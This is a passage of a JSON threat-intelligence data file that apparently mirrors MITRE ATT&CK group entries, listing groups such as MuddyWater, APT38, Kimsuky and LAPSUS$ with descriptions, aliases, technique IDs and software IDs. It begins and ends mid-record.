      "description": "[MuddyWater](https://attack.mitre.org/groups/G0069) is a cyber espionage group assessed to be a subordinate element within Iran's Ministry of Intelligence and Security (MOIS).(Citation: CYBERCOM Iranian Intel Cyber January 2022) Since at least 2017, [MuddyWater](https://attack.mitre.org/groups/G0069) has targeted a range of government and private organizations across sectors, including telecommunications, local government, defense, and oil and natural gas organizations, in the Middle East, Asia, Africa, Europe, and North America.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022)",
      "aliases": [
        "MuddyWater",
        "Earth Vetala",
        "MERCURY",
        "Static Kitten",
        "Seedworm",
        "TEMP.Zagros",
        "Mango Sandstorm",
        "TA450"
      ],
      "techniques": [
        "T1566.002",
        "T1137.001",
        "T1574.001",
        "T1588.002",
        "T1218.005",
        "T1047",
        "T1003.004",
        "T1566.001",
        "T1559.001",
        "T1059.003",
        "T1218.003",
        "T1036.005",
        "T1562.001",
        "T1087.002",
        "T1059.007",
        "T1583.006",
        "T1059.005",
        "T1016",
        "T1547.001",
        "T1140",
        "T1559.002",
        "T1027.010",
        "T1027.004",
        "T1518.001",
        "T1074.001",
        "T1113",
        "T1071.001",
        "T1518",
        "T1083",
        "T1548.002",
        "T1105",
        "T1573.001",
        "T1555.003",
        "T1560.001",
        "T1059.006",
        "T1049",
        "T1082",
        "T1555",
        "T1057",
        "T1132.001",
        "T1104",
        "T1204.001",
        "T1027.003",
        "T1003.001",
        "T1053.005",
        "T1090.002",
        "T1204.002",
        "T1033",
        "T1219",
        "T1041",
        "T1059.001",
        "T1102.002",
        "T1218.011",
        "T1552.001",
        "T1190",
        "T1210",
        "T1203",
        "T1003.005"
      ],
      "software": [
        "S0594",
        "S0194",
        "S0002",
        "S0349",
        "S0488",
        "S0591",
        "S0363",
        "S0592",
        "S0250",
        "S1037",
        "S0223",
        "S1035",
        "S1047",
        "S1046",
        "S0450"
      ],
      "url": "https://attack.mitre.org/groups/G0069",
      "stix_id": "intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-08-29T14:59:08.071000+00:00"
    },
    "G0082": {
      "id": "G0082",
      "name": "APT38",
      "description": "[APT38](https://attack.mitre.org/groups/G0082) is a North Korean state-sponsored threat group that specializes in financial cyber operations; it has been attributed to the Reconnaissance General Bureau.(Citation: CISA AA20-239A BeagleBoyz August 2020) Active since at least 2014, [APT38](https://attack.mitre.org/groups/G0082) has targeted banks, financial institutions, casinos, cryptocurrency exchanges, SWIFT system endpoints, and ATMs in at least 38 countries worldwide. Significant operations include the 2016 Bank of Bangladesh heist, during which [APT38](https://attack.mitre.org/groups/G0082) stole $81 million, as well as attacks against Bancomext (Citation: FireEye APT38 Oct 2018) and Banco de Chile (Citation: FireEye APT38 Oct 2018); some of their attacks have been destructive.(Citation: CISA AA20-239A BeagleBoyz August 2020)(Citation: FireEye APT38 Oct 2018)(Citation: DOJ North Korea Indictment Feb 2021)(Citation: Kaspersky Lazarus Under The Hood Blog 2017)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.",
      "aliases": [
        "APT38",
        "NICKEL GLADSTONE",
        "BeagleBoyz",
        "Bluenoroff",
        "Stardust Chollima",
        "Sapphire Sleet",
        "COPERNICIUM"
      ],
      "techniques": [
        "T1486",
        "T1055",
        "T1033",
        "T1112",
        "T1049",
        "T1070.004",
        "T1036.006",
        "T1056.001",
        "T1518.001",
        "T1543.003",
        "T1548.002",
        "T1189",
        "T1083",
        "T1059.003",
        "T1140",
        "T1059.005",
        "T1529",
        "T1204.001",
        "T1071.001",
        "T1105",
        "T1562.003",
        "T1027.002",
        "T1217",
        "T1070.001",
        "T1218.005",
        "T1070.006",
        "T1485",
        "T1110",
        "T1135",
        "T1553.005",
        "T1082",
        "T1565.002",
        "T1561.002",
        "T1036.003",
        "T1053.005",
        "T1588.002",
        "T1505.003",
        "T1115",
        "T1562.004",
        "T1218.011",
        "T1565.003",
        "T1583.001",
        "T1106",
        "T1218.001",
        "T1562.001",
        "T1204.002",
        "T1565.001",
        "T1005",
        "T1059.001",
        "T1053.003",
        "T1566.001",
        "T1218.007",
        "T1569.002",
        "T1480.002",
        "T1057"
      ],
      "software": [
        "S0039",
        "S0002",
        "S0593",
        "S0376",
        "S0607",
        "S0334"
      ],
      "url": "https://attack.mitre.org/groups/G0082",
      "stix_id": "intrusion-set--00f67a77-86a4-4adf-be26-1a54fc713340",
      "created": "2019-01-29T21:27:24.793000+00:00",
      "modified": "2025-01-22T21:54:11.727000+00:00"
    },
    "G0134": {
      "id": "G0134",
      "name": "Transparent Tribe",
      "description": "[Transparent Tribe](https://attack.mitre.org/groups/G0134) is a suspected Pakistan-based threat group that has been active since at least 2013, primarily targeting diplomatic, defense, and research organizations in India and Afghanistan.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Transparent Tribe May 2021)",
      "aliases": [
        "Transparent Tribe",
        "COPPER FIELDSTONE",
        "APT36",
        "Mythic Leopard",
        "ProjectM"
      ],
      "techniques": [
        "T1189",
        "T1608.004",
        "T1204.002",
        "T1027.013",
        "T1568",
        "T1584.001",
        "T1059.005",
        "T1566.002",
        "T1036.005",
        "T1583.001",
        "T1564.001",
        "T1203",
        "T1566.001",
        "T1204.001",
        "T1608.001",
        "T1566.002",
        "T1204.001",
        "T1204.002",
        "T1566.001",
        "T1059.005",
        "T1583.001",
        "T1587.003"
      ],
      "software": [
        "S0334",
        "S0644",
        "S0385",
        "S0115",
        "S0643",
        "S0115"
      ],
      "url": "https://attack.mitre.org/groups/G0134",
      "stix_id": "intrusion-set--e44e0985-bc65-4a8f-b578-211c858128e3",
      "created": "2021-09-02T15:14:33.738000+00:00",
      "modified": "2024-04-10T22:30:51.062000+00:00"
    },
    "G0050": {
      "id": "G0050",
      "name": "APT32",
      "description": "[APT32](https://attack.mitre.org/groups/G0050) is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims.(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: ESET OceanLotus)",
      "aliases": [
        "APT32",
        "SeaLotus",
        "OceanLotus",
        "APT-C-00",
        "Canvas Cyclone",
        "BISMUTH"
      ],
      "techniques": [
        "T1550.002",
        "T1036",
        "T1059.007",
        "T1047",
        "T1072",
        "T1570",
        "T1564.004",
        "T1552.002",
        "T1055",
        "T1216.001",
        "T1566.001",
        "T1135",
        "T1033",
        "T1571",
        "T1082",
        "T1583.001",
        "T1012",
        "T1027.010",
        "T1059.003",
        "T1048.003",
        "T1574.001",
        "T1566.002",
        "T1598.003",
        "T1087.001",
        "T1059.001",
        "T1003.001",
        "T1046",
        "T1608.004",
        "T1041",
        "T1036.004",
        "T1003",
        "T1078.003",
        "T1589",
        "T1070.006",
        "T1189",
        "T1218.011",
        "T1059",
        "T1112",
        "T1071.003",
        "T1560",
        "T1204.001",
        "T1071.001",
        "T1036.005",
        "T1070.004",
        "T1070.001",
        "T1027.011",
        "T1105",
        "T1053.005",
        "T1036.003",
        "T1543.003",
        "T1608.001",
        "T1222.002",
        "T1569.002",
        "T1018",
        "T1218.005",
        "T1083",
        "T1059.005",
        "T1588.002",
        "T1021.002",
        "T1550.003",
        "T1583.006",
        "T1505.003",
        "T1564.001",
        "T1016",
        "T1027.016",
        "T1049",
        "T1564.003",
        "T1027.013",
        "T1056.001",
        "T1589.002",
        "T1218.010",
        "T1068",
        "T1585.001",
        "T1137",
        "T1203",
        "T1204.002",
        "T1547.001",
        "T1102"
      ],
      "software": [
        "S0002",
        "S0100",
        "S0108",
        "S0099",
        "S0039",
        "S0585",
        "S0154",
        "S0157",
        "S0352",
        "S0156",
        "S1078",
        "S0158",
        "S0155",
        "S0354",
        "S0477"
      ],
      "url": "https://attack.mitre.org/groups/G0050",
      "stix_id": "intrusion-set--247cb30b-955f-42eb-97a5-a89fef69341e",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2024-04-17T22:07:49.430000+00:00"
    },
    "G0060": {
      "id": "G0060",
      "name": "BRONZE BUTLER",
      "description": "[BRONZE BUTLER](https://attack.mitre.org/groups/G0060) is a cyber espionage group with likely Chinese origins that has been active since at least 2008. The group primarily targets Japanese organizations, particularly those in government, biotechnology, electronics manufacturing, and industrial chemistry.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019)",
      "aliases": [
        "BRONZE BUTLER",
        "REDBALDKNIGHT",
        "Tick"
      ],
      "techniques": [
        "T1140",
        "T1005",
        "T1007",
        "T1070.004",
        "T1059.006",
        "T1566.001",
        "T1036.005",
        "T1113",
        "T1036",
        "T1588.002",
        "T1548.002",
        "T1059.005",
        "T1132.001",
        "T1518",
        "T1071.001",
        "T1039",
        "T1124",
        "T1189",
        "T1574.001",
        "T1562.001",
        "T1003.001",
        "T1203",
        "T1018",
        "T1560.001",
        "T1053.002",
        "T1102.001",
        "T1053.005",
        "T1080",
        "T1204.002",
        "T1027.001",
        "T1547.001",
        "T1059.001",
        "T1059.003",
        "T1105",
        "T1550.003",
        "T1573.001",
        "T1027.003",
        "T1087.002",
        "T1083",
        "T1036.002"
      ],
      "software": [
        "S0002",
        "S0106",
        "S0110",
        "S0111",
        "S0039",
        "S0005",
        "S0008",
        "S0471",
        "S0469",
        "S0470",
        "S0472",
        "S0187",
        "S0596",
        "S0473"
      ],
      "url": "https://attack.mitre.org/groups/G0060",
      "stix_id": "intrusion-set--93f52415-0fe4-4d3d-896c-fc9b8e88ab90",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:48:57.719000+00:00"
    },
    "G1005": {
      "id": "G1005",
      "name": "POLONIUM",
      "description": "[POLONIUM](https://attack.mitre.org/groups/G1005) is a Lebanon-based group that has primarily targeted Israeli organizations, including critical manufacturing, information technology, and defense industry companies, since at least February 2022. Security researchers assess [POLONIUM](https://attack.mitre.org/groups/G1005) has coordinated their operations with multiple actors affiliated with Iran\u2019s Ministry of Intelligence and Security (MOIS), based on victim overlap as well as common techniques and tooling.(Citation: Microsoft POLONIUM June 2022)",
      "aliases": [
        "POLONIUM",
        "Plaid Rain"
      ],
      "techniques": [
        "T1567.002",
        "T1102.002",
        "T1090",
        "T1588.002",
        "T1199",
        "T1583.006",
        "T1078"
      ],
      "software": [
        "S1023",
        "S1024"
      ],
      "url": "https://attack.mitre.org/groups/G1005",
      "stix_id": "intrusion-set--5f3d0238-d058-44a9-8812-3dd1b6741a8c",
      "created": "2022-07-01T19:07:04.253000+00:00",
      "modified": "2024-01-08T21:56:22.594000+00:00"
    },
    "G1023": {
      "id": "G1023",
      "name": "APT5",
      "description": "[APT5](https://attack.mitre.org/groups/G1023) is a China-based espionage actor that has been active since at least 2007 primarily targeting the telecommunications, aerospace, and defense industries throughout the U.S., Europe, and Asia. [APT5](https://attack.mitre.org/groups/G1023) has displayed advanced tradecraft and significant interest in compromising networking devices and their underlying software including through the use of zero-day exploits.(Citation: NSA APT5 Citrix Threat Hunting December 2022)(Citation: Microsoft East Asia Threats September 2023)(Citation: Mandiant Pulse Secure Zero-Day April 2021)(Citation: Mandiant Pulse Secure Update May 2021)(Citation: FireEye Southeast Asia Threat Landscape March 2015)(Citation: Mandiant Advanced Persistent Threats)  ",
      "aliases": [
        "APT5",
        "Mulberry Typhoon",
        "MANGANESE",
        "BRONZE FLEETWOOD",
        "Keyhole Panda",
        "UNC2630"
      ],
      "techniques": [
        "T1059.001",
        "T1136.001",
        "T1070.006",
        "T1021.001",
        "T1654",
        "T1583.005",
        "T1562.006",
        "T1074.001",
        "T1554",
        "T1056.001",
        "T1078.004",
        "T1560.001",
        "T1003.001",
        "T1003.002",
        "T1070.004",
        "T1098.007",
        "T1057",
        "T1070",
        "T1053.003",
        "T1059.003",
        "T1021.004",
        "T1055",
        "T1505.003",
        "T1049",
        "T1078.002",
        "T1036.005",
        "T1070.003",
        "T1083",
        "T1190",
        "T1090.003",
        "T1190",
        "T1583.003",
        "T1588.002"
      ],
      "software": [
        "S0057",
        "S1050",
        "S0002",
        "S0039",
        "S0104",
        "S0012",
        "S1113",
        "S1104",
        "S1110",
        "S0007",
        "S1109",
        "S0032",
        "S1108"
      ],
      "url": "https://attack.mitre.org/groups/G1023",
      "stix_id": "intrusion-set--c1aab4c9-4c34-4f4f-8541-d529e46a07f9",
      "created": "2024-02-05T19:27:35.655000+00:00",
      "modified": "2025-04-04T17:08:23.100000+00:00"
    },
    "G0135": {
      "id": "G0135",
      "name": "BackdoorDiplomacy",
      "description": "[BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) is a cyber espionage threat group that has been active since at least 2017. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) has targeted Ministries of Foreign Affairs and telecommunication companies in Africa, Europe, the Middle East, and Asia.(Citation: ESET BackdoorDiplomacy Jun 2021)",
      "aliases": [
        "BackdoorDiplomacy"
      ],
      "techniques": [
        "T1027",
        "T1505.003",
        "T1190",
        "T1588.002",
        "T1036.005",
        "T1055.001",
        "T1105",
        "T1074.001",
        "T1046",
        "T1049",
        "T1120",
        "T1095",
        "T1574.001",
        "T1588.001",
        "T1036.004"
      ],
      "software": [
        "S0002",
        "S0590",
        "S0262",
        "S0647",
        "S0020"
      ],
      "url": "https://attack.mitre.org/groups/G0135",
      "stix_id": "intrusion-set--9735c036-8ebe-47e9-9c77-b0ae656dab93",
      "created": "2021-09-21T14:52:49.596000+00:00",
      "modified": "2025-04-25T14:48:58.613000+00:00"
    },
    "G0094": {
      "id": "G0094",
      "name": "Kimsuky",
      "description": "[Kimsuky](https://attack.mitre.org/groups/G0094) is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the UN and the government, education, business services, and manufacturing sectors in the United States, Japan, Russia, and Europe. [Kimsuky](https://attack.mitre.org/groups/G0094) has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions. [Kimsuky](https://attack.mitre.org/groups/G0094) operations have overlapped with those of other North Korean cyber espionage actors likely as a result of ad hoc collaborations or other limited resource sharing.(Citation: EST Kimsuky April 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: CISA AA20-301A Kimsuky)(Citation: Mandiant APT43 March 2024)(Citation: Proofpoint TA427 April 2024)\n\n[Kimsuky](https://attack.mitre.org/groups/G0094) was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: EST Kimsuky SmokeScreen April 2019)(Citation: AhnLab Kimsuky Kabar Cobra Feb 2019)\n\nNorth Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.\n\nIn 2023, [Kimsuky](https://attack.mitre.org/groups/G0094) has used commercial large language models to assist with vulnerability research, scripting, social engineering and reconnaissance.(Citation: MSFT-AI)",
      "aliases": [
        "Kimsuky",
        "Black Banshee",
        "Velvet Chollima",
        "Emerald Sleet",
        "THALLIUM",
        "APT43",
        "TA427",
        "Springtail"
      ],
      "techniques": [
        "T1005",
        "T1587.001",
        "T1583",
        "T1021.001",
        "T1585.002",
        "T1566",
        "T1204.002",
        "T1040",
        "T1566.002",
        "T1539",
        "T1588.002",
        "T1078.003",
        "T1140",
        "T1608.001",
        "T1105",
        "T1587",
        "T1567.002",
        "T1598",
        "T1553.002",
        "T1036.004",
        "T1102.002",
        "T1204.001",
        "T1534",
        "T1190",
        "T1593.001",
        "T1585",
        "T1589.003",
        "T1218.011",
        "T1564.002",
        "T1176.001",
        "T1070.004",
        "T1219.002",
        "T1583.004",
        "T1620",
        "T1111",
        "T1594",
        "T1059.003",
        "T1583.001",
        "T1012",
        "T1591",
        "T1071.001",
        "T1585.001",
        "T1657",
        "T1136.001",
        "T1007",
        "T1586.002",
        "T1560.003",
        "T1070.006",
        "T1598.003",
        "T1596",
        "T1550.002",
        "T1557",
        "T1518.001",
        "T1218.005",
        "T1041",
        "T1185",
        "T1133",
        "T1082",
        "T1584.001",
        "T1589.002",
        "T1059.007",
        "T1656",
        "T1027",
        "T1074.001",
        "T1071.003",
        "T1056.001",
        "T1027.002",
        "T1552.001",
        "T1102.001",
        "T1560.001",
        "T1016",
        "T1555.003",
        "T1546.001",
        "T1566.001",
        "T1057",
        "T1055",
        "T1113",
        "T1112",
        "T1059.001",
        "T1562.004",
        "T1588.005",
        "T1218.010",
        "T1547.001",
        "T1562.001",
        "T1543.003",
        "T1583.006",
        "T1593",
        "T1083",
        "T1564.003",
        "T1053.005",
        "T1036.005",
        "T1593.002",
        "T1055.012",
        "T1588.003",
        "T1114.003",
        "T1071.002",
        "T1003.001",
        "T1205",
        "T1059.005",
        "T1098.007",
        "T1059.006",
        "T1505.003",
        "T1114.002"
      ],
      "software": [
        "S0111",
        "S0527",
        "S0262",
        "S0029",
        "S0002",
        "S1196",
        "S1025",
        "S1197",
        "S0252",
        "S0032",
        "S0622",
        "S1198",
        "S0353",
        "S0249",
        "S0526",
        "S0414",
        "S1201"
      ],
      "url": "https://attack.mitre.org/groups/G0094",
      "stix_id": "intrusion-set--0ec2f388-bf0f-4b5c-97b1-fc736d26c25f",
      "created": "2019-08-26T15:03:02.577000+00:00",
      "modified": "2025-01-29T21:17:48.165000+00:00"
    },
    "G0065": {
      "id": "G0065",
      "name": "Leviathan",
      "description": "[Leviathan](https://attack.mitre.org/groups/G0065) is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.(Citation: CISA AA21-200A APT40 July 2021) Active since at least 2009, [Leviathan](https://attack.mitre.org/groups/G0065) has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Australia, Europe, the Middle East, and Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: CISA Leviathan 2024)",
      "aliases": [
        "Leviathan",
        "MUDCARP",
        "Kryptonite Panda",
        "Gadolinium",
        "BRONZE MOHAWK",
        "TEMP.Jumper",
        "APT40",
        "TEMP.Periscope",
        "Gingham Typhoon"
      ],
      "techniques": [
        "T1567.002",
        "T1595.002",
        "T1102.003",
        "T1047",
        "T1021.004",
        "T1105",
        "T1547.001",
        "T1027.013",
        "T1589.001",
        "T1003.001",
        "T1586.001",
        "T1090.003",
        "T1027.001",
        "T1583.001",
        "T1585.002",
        "T1566.002",
        "T1189",
        "T1546.003",
        "T1027.003",
        "T1585.001",
        "T1059.001",
        "T1547.009",
        "T1055.001",
        "T1566.001",
        "T1584.004",
        "T1203",
        "T1059.005",
        "T1078",
        "T1553.002",
        "T1559.002",
        "T1587.004",
        "T1197",
        "T1074.001",
        "T1204.002",
        "T1140",
        "T1074.002",
        "T1534",
        "T1190",
        "T1218.010",
        "T1041",
        "T1505.003",
        "T1021.001",
        "T1584.008",
        "T1027.015",
        "T1560",
        "T1572",
        "T1204.001",
        "T1133",
        "T1003",
        "T1586.002",
        "T1021.002",
        "T1074.001",
        "T1615",
        "T1213",
        "T1552",
        "T1078.002",
        "T1552.001",
        "T1082",
        "T1018",
        "T1190",
        "T1558.003",
        "T1041",
        "T1482",
        "T1135",
        "T1594",
        "T1078",
        "T1056",
        "T1505.003",
        "T1562.004",
        "T1078.003",
        "T1068",
        "T1528",
        "T1111",
        "T1021.004",
        "T1212",
        "T1588.006"
      ],
      "software": [
        "S0005",
        "S0190",
        "S0110",
        "S0363",
        "S0039",
        "S0194",
        "S0183",
        "S0232",
        "S0021",
        "S0069",
        "S0642",
        "S0032",
        "S0233",
        "S0228",
        "S0229",
        "S0154",
        "S0020"
      ],
      "url": "https://attack.mitre.org/groups/G0065",
      "stix_id": "intrusion-set--7113eaa5-ba79-4fb3-b68a-398ee9cd698e",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-02-03T21:55:54.314000+00:00"
    },
    "G1046": {
      "id": "G1046",
      "name": "Storm-1811",
      "description": "[Storm-1811](https://attack.mitre.org/groups/G1046) is a financially-motivated entity linked to [Black Basta](https://attack.mitre.org/software/S1070) ransomware deployment. [Storm-1811](https://attack.mitre.org/groups/G1046) is notable for unique phishing and social engineering mechanisms for initial access, such as overloading victim email inboxes with non-malicious spam to prompt a fake \"help desk\" interaction leading to the deployment of adversary tools and capabilities.(Citation: Microsoft Storm-1811 2024)(Citation: rapid7-email-bombing)(Citation: RedCanary Storm-1811 2024)(Citation: RedCanary June Insights 2024)",
      "aliases": [
        "Storm-1811"
      ],
      "techniques": [
        "T1585.003",
        "T1074.001",
        "T1667",
        "T1547.001",
        "T1583.001",
        "T1036.005",
        "T1588.002",
        "T1219.002",
        "T1059.001",
        "T1059.003",
        "T1140",
        "T1656",
        "T1036.010",
        "T1056",
        "T1574.001",
        "T1204.002",
        "T1566.004",
        "T1027.013",
        "T1105",
        "T1570",
        "T1021.004",
        "T1486",
        "T1036",
        "T1482",
        "T1566.003",
        "T1566.002",
        "T1087.002",
        "T1033",
        "T1048.002",
        "T1222.001",
        "T1021.002"
      ],
      "software": [
        "S1209",
        "S0190",
        "S0029",
        "S0357",
        "S1070",
        "S0154",
        "S0650"
      ],
      "url": "https://attack.mitre.org/groups/G1046",
      "stix_id": "intrusion-set--319fd652-edde-46b2-9987-3519493989f5",
      "created": "2025-03-14T12:48:44.771000+00:00",
      "modified": "2025-03-14T19:17:33.785000+00:00"
    },
    "G0130": {
      "id": "G0130",
      "name": "Ajax Security Team",
      "description": "[Ajax Security Team](https://attack.mitre.org/groups/G0130) is a group that has been active since at least 2010 and believed to be operating out of Iran. By 2014 [Ajax Security Team](https://attack.mitre.org/groups/G0130) transitioned from website defacement operations to malware-based cyber espionage campaigns targeting the US defense industrial base and Iranian users of anti-censorship technologies.(Citation: FireEye Operation Saffron Rose 2013)",
      "aliases": [
        "Ajax Security Team",
        "Operation Woolen-Goldfish",
        "AjaxTM",
        "Rocket Kitten",
        "Flying Kitten",
        "Operation Saffron Rose"
      ],
      "techniques": [
        "T1056.001",
        "T1566.003",
        "T1566.001",
        "T1204.002",
        "T1555.003",
        "T1105"
      ],
      "software": [
        "S0225",
        "S0224"
      ],
      "url": "https://attack.mitre.org/groups/G0130",
      "stix_id": "intrusion-set--fa19de15-6169-428d-9cd6-3ca3d56075b7",
      "created": "2021-04-14T13:17:43.941000+00:00",
      "modified": "2023-10-09T16:46:55.719000+00:00"
    },
    "G1024": {
      "id": "G1024",
      "name": "Akira",
      "description": "[Akira](https://attack.mitre.org/groups/G1024) is a ransomware variant and ransomware deployment entity active since at least March 2023.(Citation: Arctic Wolf Akira 2023) [Akira](https://attack.mitre.org/groups/G1024) uses compromised credentials to access single-factor external access mechanisms such as VPNs for initial access, then various publicly-available tools and techniques for lateral movement.(Citation: Arctic Wolf Akira 2023)(Citation: Secureworks GOLD SAHARA) [Akira](https://attack.mitre.org/groups/G1024) operations are associated with \"double extortion\" ransomware activity, where data is exfiltrated from victim environments prior to encryption, with threats to publish files if a ransom is not paid. Technical analysis of [Akira](https://attack.mitre.org/software/S1129) ransomware indicates variants capable of targeting Windows or VMWare ESXi hypervisors and multiple overlaps with [Conti](https://attack.mitre.org/software/S0575) ransomware.(Citation: BushidoToken Akira 2023)(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)",
      "aliases": [
        "Akira",
        "GOLD SAHARA",
        "PUNK SPIDER",
        "Howling Scorpius"
      ],
      "techniques": [
        "T1567.002",
        "T1213.002",
        "T1531",
        "T1482",
        "T1036.005",
        "T1078",
        "T1558",
        "T1018",
        "T1021.001",
        "T1562.001",
        "T1059.001",
        "T1657",
        "T1486",
        "T1133",
        "T1027.001",
        "T1219",
        "T1560.001"
      ],
      "software": [
        "S0002",
        "S0029",
        "S0552",
        "S0349",
        "S1040",
        "S1194",
        "S1129",
        "S1191"
      ],
      "url": "https://attack.mitre.org/groups/G1024",
      "stix_id": "intrusion-set--46bb06cb-f2d9-4b37-8c92-a27e224ad90d",
      "created": "2024-02-20T23:59:25.966000+00:00",
      "modified": "2025-03-11T15:36:38.244000+00:00"
    },
    "G0129": {
      "id": "G0129",
      "name": "Mustang Panda",
      "description": "[Mustang Panda](https://attack.mitre.org/groups/G0129) is a China-based cyber espionage threat actor that was first observed in 2017 but may have been conducting operations since at least 2014. [Mustang Panda](https://attack.mitre.org/groups/G0129) has targeted government entities, nonprofits, religious, and other non-governmental organizations in the U.S., Europe, Mongolia, Myanmar, Pakistan, and Vietnam, among others.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019) ",
      "aliases": [
        "Mustang Panda",
        "TA416",
        "RedDelta",
        "BRONZE PRESIDENT"
      ],
      "techniques": [
        "T1016",
        "T1608.001",
        "T1047",
        "T1573.001",
        "T1204.001",
        "T1049",
        "T1059.005",
        "T1053.005",
        "T1598.003",
        "T1564.001",
        "T1218.005",
        "T1585.002",
        "T1219.002",
        "T1218.004",
        "T1560.001",
        "T1071.001",
        "T1566.002",
        "T1091",
        "T1059.003",
        "T1052.001",
        "T1560.003",
        "T1070.004",
        "T1057",
        "T1082",
        "T1203",
        "T1608",
        "T1566.001",
        "T1083",
        "T1518",
        "T1583.001",
        "T1574.001",
        "T1546.003",
        "T1003.003",
        "T1027",
        "T1547.001",
        "T1119",
        "T1105",
        "T1074.001",
        "T1059.001",
        "T1027.016",
        "T1204.002",
        "T1036.007",
        "T1102",
        "T1036.005",
        "T1059.001",
        "T1071.001",
        "T1553.002",
        "T1090",
        "T1608.001",
        "T1574.001",
        "T1095",
        "T1480",
        "T1082",
        "T1547.001",
        "T1203",
        "T1566.002",
        "T1027.013",
        "T1566.001",
        "T1204.002",
        "T1036.004",
        "T1564.001",
        "T1588.004",
        "T1218.007",
        "T1583.001",
        "T1218.014",
        "T1204.001"
      ],
      "software": [
        "S0590",
        "S0154",
        "S0662",
        "S0012",
        "S0013",
        "S0596",
        "S0013"
      ],
      "url": "https://attack.mitre.org/groups/G0129",
      "stix_id": "intrusion-set--420ac20b-f2b9-42b8-aa1a-6d4b72895ca4",
      "created": "2021-04-12T15:56:28.861000+00:00",
      "modified": "2025-04-16T20:37:34.723000+00:00"
    },
    "G1004": {
      "id": "G1004",
      "name": "LAPSUS$",
      "description": "[LAPSUS$](https://attack.mitre.org/groups/G1004) is cyber criminal threat group that has been active since at least mid-2021. [LAPSUS$](https://attack.mitre.org/groups/G1004) specializes in large-scale social engineering and extortion operations, including destructive attacks without the use of ransomware. The group has targeted organizations globally, including in the government, manufacturing, higher education, energy, healthcare, technology, telecommunications, and media sectors.(Citation: BBC LAPSUS Apr 2022)(Citation: MSTIC DEV-0537 Mar 2022)(Citation: UNIT 42 LAPSUS Mar 2022)",
      "aliases": [
        "LAPSUS$",
        "DEV-0537",
        "Strawberry Tempest"
      ],
      "techniques": [
        "T1589",
        "T1005",
        "T1069.002",
        "T1213.001",
        "T1588.002",
        "T1485",
        "T1213.003",
        "T1213.002",
        "T1583.003",
        "T1591.004",
        "T1090",
        "T1087.002",
        "T1133",
        "T1078",
        "T1656",
        "T1588.001",
        "T1598.004",
        "T1204",
        "T1552.008",
        "T1489",
        "T1593.003",
        "T1136.003",
        "T1114.003",
        "T1591.002",
        "T1578.003",
        "T1555.003",
        "T1531",
        "T1589.001",
        "T1068",
        "T1621",
        "T1098.003",
        "T1003.006",
        "T1586.002",
        "T1213.005",
        "T1589.002",
        "T1584.002",
        "T1003.003",
        "T1555.005",
        "T1199",
        "T1597.002",
        "T1578.002",
        "T1078.004",
        "T1111"
      ],
      "software": [
        "S0002"
      ],
      "url": "https://attack.mitre.org/groups/G1004",
      "stix_id": "intrusion-set--d8bc9788-4f7d-41a9-9e9d-ee1ea18a8cf7",
      "created": "2022-06-09T19:14:31.327000+00:00",
      "modified": "2025-04-21T19:40:47.538000+00:00"
    },
    "G0114": {
      "id": "G0114",
      "name": "Chimera",
      "description": "[Chimera](https://attack.mitre.org/groups/G0114) is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.(Citation: Cycraft Chimera April 2020)(Citation: NCC Group Chimera January 2021)",
      "aliases": [
        "Chimera"
      ],
      "techniques": [
        "T1574.001",
        "T1074.002",
        "T1053.005",
        "T1569.002",
        "T1041",
        "T1078",
        "T1550.002",
        "T1071.001",
        "T1106",
        "T1556.001",
        "T1070.001",
        "T1071.004",
        "T1482",
        "T1560.001",
        "T1021.006",
        "T1083",
        "T1087.002",
        "T1057",
        "T1021.002",
        "T1059.001",
        "T1003.003",
        "T1074.001",
        "T1213.002",
        "T1135",
        "T1036.005",
        "T1570",
        "T1007",
        "T1027.010",
        "T1016",
        "T1046",
        "T1033",
        "T1087.001",
        "T1572",
        "T1078.002",
        "T1069.001",
